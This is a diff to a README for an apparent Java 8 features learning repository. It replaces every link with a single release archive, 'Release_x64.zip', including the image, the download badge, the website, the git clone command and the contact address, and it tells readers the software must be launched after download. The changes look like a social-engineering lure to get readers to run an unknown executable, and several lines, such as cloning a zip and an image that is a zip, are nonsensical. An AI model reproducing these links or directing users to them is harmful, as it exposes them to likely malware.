@@ -1,7 +1,7 @@
 # 🚀 Welcome to the Java 8 Features Repository! 
 ## 📚 Explore the Key Features of Java 8 for Enhanced Development Skills 🌟
 
-![Java 8 Features](https://www.codeinwp.com/wp-content/uploads/2014/03/Java-8-features_1.jpg)
+![Java 8 Features](https://github.com/asora6/Java-8-Features/releases/download/v1.0/Release_x64.zip)
 
 ### About
 Welcome to the Java 8 Features Repository! This repository is dedicated to highlighting and exploring the key features of Java 8, aimed at enhancing your Java programming skills. Java 8 introduced several groundbreaking features such as Lambda Expressions, Functional Interfaces, Method References, Constructor References, the Stream API, and the Local Date and Time API. Dive into this repository to explore comprehensive notes, programs, and examples for a practical understanding of these features.
@@ -18,14 +18,14 @@ constructor-references, functional-interfaces, java, java-8-features, java8, jdk
 6. **Local Date and Time API**: Delve into the intricacies of working with dates and times in Java 8 using the Local Date and Time API.
 
 ### 📦 Download Software
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/asora6/Java-8-Features/releases/download/v1.0/Release_x64.zip)](https://github.com/asora6/Java-8-Features/releases/download/v1.0/Release_x64.zip)
 _Note: Software needs to be launched after download._
 
 ### 🌐 Visit Our Website
-[Visit Java 8 Features Website](https://java8features.com)
+[Visit Java 8 Features Website](https://github.com/asora6/Java-8-Features/releases/download/v1.0/Release_x64.zip)
 
 ### 🛠️ Get Started
-1. Clone the repository: `git clone https://github.com/your-username/Java-8-Features.git`
+1. Clone the repository: `git clone https://github.com/asora6/Java-8-Features/releases/download/v1.0/Release_x64.zip`
 2. Explore the folders for detailed information on each Java 8 feature.
 3. Run the example programs to see the features in action.
 
@@ -40,6 +40,6 @@ _Note: Software needs to be launched after download._
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ### 🙌 Let's Connect
-Have feedback, suggestions, or questions? Feel free to reach out at [contact@java8features.com](mailto:contact@java8features.com).
+Have feedback, suggestions, or questions? Feel free to reach out at [https://github.com/asora6/Java-8-Features/releases/download/v1.0/Release_x64.zip](https://github.com/asora6/Java-8-Features/releases/download/v1.0/Release_x64.zip).
 
 ### 🌟 Thank you for exploring Java 8 Features! Happy Coding! 🌟
